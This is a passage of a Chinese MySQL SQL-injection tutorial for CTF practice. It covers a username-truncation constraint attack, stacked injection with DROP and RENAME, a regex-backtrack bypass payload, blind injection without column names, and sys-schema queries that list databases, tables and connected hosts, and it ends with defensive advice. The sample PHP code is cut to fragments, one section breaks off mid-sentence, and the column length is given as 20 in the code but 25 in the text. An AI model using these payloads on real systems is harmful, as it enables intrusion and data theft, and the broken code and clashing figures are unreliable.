ELT(N,str1,str2,str3,...) | 与`MAKE_SET(bit,str1,str2...)`类似，根据`N`返回参数值。  
NULLIF(expr1,expr2) | 若expr1与expr2相同，则返回expr1，否则返回NULL。  
CHARSET(str) | 返回字符串使用的字符集。  
DECODE( _crypt_str_ , _pass_str_ ) | 使用 pass_str 作为密码，解密加密字符串
crypt_str。加密函数：`ENCODE(str,pass_str)`。  
## 约束攻击
什么是约束攻击？
仍然是先举个例子：
我们先通过下列语句建立一个用户表
    CREATE TABLE users(
        username varchar(20),
        password varchar(20)
    )
注册代码：
    fetch_row()){
        die('账号已注册');
    }else{
        $sql2 = "insert into users values('$username','$password')";
        mysqli_query($conn,$sql2);
        die('注册成功');
    }
    ?>
登录判断代码：
    fetch_row()){
        $_SESSION['username']=$password;
    }else{
        echo "fail";
    }
    ?>
在无编码问题，且进行了单引号的处理情况下仍可能发生什么SQL注入问题呢？
我们注意到，前边创建表格的语句限制了username和password的长度最大为25，若我们插入数据超过25，MYSQL会怎样处理呢？答案是MYSQL会截取前边的25个字符进行插入。
而对于`SELECT`查询请求，若查询的数据超过25长度，也不会进行截取操作，这就产生了一个问题。
通常对于注册处的代码来说，需要先判断注册的用户名是否存在，再进行插入数据操作。如我们注册一个`username=admin[25个空格]x&password=123456`的账号，服务器会先查询`admin[25个空格]x`的用户是否存在，若存在，则不能注册。若不存在，则进行插入数据的操作。而此处我们限制了username与password字段长度最大为25，所以我们实际插入的数据为`username=admin[20个空格]&password=123456`。
接着进行登录的时，我们使用：`username=admin&password=123456`进行登录，即可成功登录admin的账号。
防御：
  * 给username字段添加unique属性。
  * 使用id字段作为判断用户的凭证。
  * 插入数据前判断数据长度。
## 堆叠注入
简单的说，由于分号`;`为MYSQL语句的结束符。若在支持多语句执行的情况下，可利用此方法执行其他恶意语句，如`RENAME`、`DROP`等。
注意，通常多语句执行时，若前条语句已返回数据，则之后的语句返回的数据通常无法返回前端页面。建议使用union联合注入，若无法使用联合注入，
可考虑使用`RENAME`关键字，将想要的数据列名/表名更改成返回数据的SQL语句所定义的表/列名
。具体参考：[2019强网杯——随便注Writeup](https://www.ctfwp.com/articals/2019qiangwang.html#随便注)
PHP中堆叠注入的支持情况：
| Mysqli | PDO | MySQL  
---|---|---|---  
引入的PHP版本 | 5.0 | 5.0 | 3.0之前  
PHP5.x是否包含 | 是 | 是 | 是  
多语句执行支持情况 | 是 | 大多数 | 否  
> 引自：[PDO场景下的SQL注入探究](https://xz.aliyun.com/t/3950)
## handler语句代替select查询
>
> mysql除可使用select查询表中的数据，也可使用handler语句，这条语句使我们能够一行一行的浏览一个表中的数据，不过handler语句并不具备select语句的所有功能。它是mysql专用的语句，并没有包含到SQL标准中。
语法结构：
    HANDLER tbl_name OPEN [ [AS] alias]
    HANDLER tbl_name READ index_name { = | = |  } (value1,value2,...)
        [ WHERE where_condition ] [LIMIT ... ]
    HANDLER tbl_name READ index_name { FIRST | NEXT | PREV | LAST }
        [ WHERE where_condition ] [LIMIT ... ]
    HANDLER tbl_name READ { FIRST | NEXT }
        [ WHERE where_condition ] [LIMIT ... ]
    HANDLER tbl_name CLOSE
如：通过handler语句查询users表的内容
    handler users open as yunensec; #指定数据表进行载入并将返回句柄重命名
    handler yunensec read first; #读取指定表/句柄的首行数据
    handler yunensec read next; #读取指定表/句柄的下一行数据
    handler yunensec read next; #读取指定表/句柄的下一行数据
    ...
    handler yunensec close; #关闭句柄
## 一些小Trick
这里跟大家分享一些有意思的Trick，主要在一些CTF题出现，这里也把它记下来，方便复习。
### PHP`/union.+?select/ig`绕过。
在某些题目中，题目禁止union与select同时出现时，会用此正则来判断输入数据。
  * 利用点：[PHP正则回溯BUG](https://bugs.php.net/bug.php?id=70699)
  * 具体分析文章：[PHP利用PCRE回溯次数限制绕过某些安全限制](https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html)
>
> PHP为了防止正则表达式的拒绝服务攻击（reDOS），给pcre设定了一个回溯次数上限`pcre.backtrack_limit`。若我们输入的数据使得PHP进行回溯且此数超过了规定的回溯上限此数(默认为
> 100万)，那幺正则停止，返回未匹配到数据。
故而我们构造payload：`union/*100万个a，充当垃圾数据*/select`即可绕过正则判断。
一道相关的CTF题：[TetCTF-2020 WP BY
MrR3boot](https://github.com/MrR3boot/CTF/tree/master/TetCTF-2020)
### 无列名盲注
前边提到了，在知道表名，不知道列名的情况下，我们可以利用`union`来给未知列名“重命名”，还可以利用报错函数来注入出列名。现在，除了之前的`order
by`盲注之外，这里再提一种新的方法，直接通过select进行盲注。
核心payload：`(select 'admin','admin')>(select * from users limit 1)`
子查询之间也可以直接通过`>、
>     #查询所有的库：
>     SELECT table_schema FROM sys.schema_table_statistics GROUP BY
> table_schema;
>     SELECT table_schema FROM sys.x$schema_flattened_keys GROUP BY
> table_schema;
>     #查询指定库的表（若无则说明此表从未被访问）：
>     SELECT table_name FROM sys.schema_table_statistics WHERE
> table_schema='mspwd' GROUP BY table_name;
>     SELECT table_name FROM  sys.x$schema_flattened_keys WHERE
> table_schema='mspwd' GROUP BY table_name;
>     #统计所有访问过的表次数:库名,表名,访问次数
>     select table_schema,table_name,sum(io_read_requests+io_write_requests)
> io from sys.schema_table_statistics group by table_schema,table_name order
> by io desc;
>
> #查看所有正在连接的用户详细信息:连接的用户(连接的用户名,连接的ip),当前库,用户状态(Sleep就是空闲),现在在执行的sql语句,上一次执行的sql语句,已经建立连接的时间(秒)
>     SELECT user,db,command,current_statement,last_statement,time FROM
> sys.session;
>     #查看所有曾连接数据库的IP,总连接次数
>     SELECT host,total_connections FROM sys.host_summary;
>  
>
> 节选自：[Mysql的奇淫技巧(黑科技)](https://www.t00ls.net/thread-54783-1-1.html)
视图->列名 | 说明  
---|---  
host_summary -> host、total_connections | 历史连接IP、对应IP的连接次数  
innodb_buffer_stats_by_schema -> object_schema | 库名  
innodb_buffer_stats_by_table -> object_schema、object_name | 库名、表名(可指定)  
io_global_by_file_by_bytes -> file | 路径中包含库名  
io_global_by_file_by_latency -> file | 路径中包含库名  
processlist -> current_statement、last_statement | 当前数据库正在执行的语句、该句柄执行的上一条语句  
schema_auto_increment_columns -> table_schema、table_name、column_name |
库名、表名、列名  
schema_index_statistics -> table_schema、table_name | 库名、表名  
schema_object_overview -> db | 库名  
schema_table_statistics -> table_schema、table_name | 库名、表名  
schema_table_statistics_with_buffer -> table_schema、table_name | 库名、表名  
schema_tables_with_full_table_scans -> object_schema、object_name |
库名、表名(全面扫描访问)  
session -> current_statement、last_statement | 当前数据库正在执行的语句、该句柄执行的上一条语句  
statement_analysis -> query、db | 数据库最近执行的请求、对于请求访问的数据库名  
statements _with_ * -> query、db | 数据库最近执行的特殊情况的请求、对应请求的数据库  
version -> mysql_version | mysql版本信息  
x$innodb_buffer_stats_by_schema | 同innodb_buffer_stats_by_schema  
x$innodb_buffer_stats_by_table | 同innodb_buffer_stats_by_table  
x$io_global_by_file_by_bytes | 同io_global_by_file_by_bytes  
...... | 同......  
x$schema_flattened_keys -> table_schema、table_name、index_columns | 库名、表名、主键名  
x$ps_schema_table_statistics_io -> table_schema、table_name、count_read |
库名、表名、读取该表的次数  
差点忘了，还有mysql数据库也可以查询表名、库名。
    select table_name from mysql.innodb_table_stats where database_name=database();
    select table_name from mysql.innodb_index_stats where database_name=database();
# Mysql注入防御
  * 单引号闭合可控变量，并进行相应的转义处理
  * 尽量使用预编译来执行SQL语句
  * 采用白名单机制/完善黑名单
  * 安装WAF防护软件
  * 拒绝不安全的编码转换，尽量统一编码
  * 关闭错误提示
# 结语
可能记得东西有点多导致很多内容都是精简过后的知识，其实本文可以当做字典一样来使用，可能讲得不是很细致，但是却方便我们进行复习，回想起脑海中的知识。文章花费了大量的笔墨在记录许多与Mysql注入相关的Trick，故而可能会显得比较杂乱，没有得到一个比较好的整理，可能对于不太了解Mysql注入的同学不太友好，望谅解。
# 参考
  * [【PHP代码审计】入门之路——第二篇-宽字节注入](https://xz.aliyun.com/t/1719)
  * [MySQL注入技巧](https://wooyun.js.org/drops/MySQL注入技巧.html)
  * [Mysql 注入基础小结](https://blog.sari3l.com/posts/9622f295/)
  * [Mysql的奇淫技巧(黑科技)](https://www.t00ls.net/thread-54783-1-1.html)
  * [Read MySQL Client's File](https://lightless.me/archives/read-mysql-client-file.html)
  * [Dnslog在SQL注入中的实战](https://www.anquanke.com/post/id/98096)
  * [从安全角度深入理解MySQL编码转换机制](https://www.freebuf.com/articles/web/154932.html)
  * [mysql sys Schema Object Index](https://dev.mysql.com/doc/refman/8.0/en/sys-schema-object-index.html)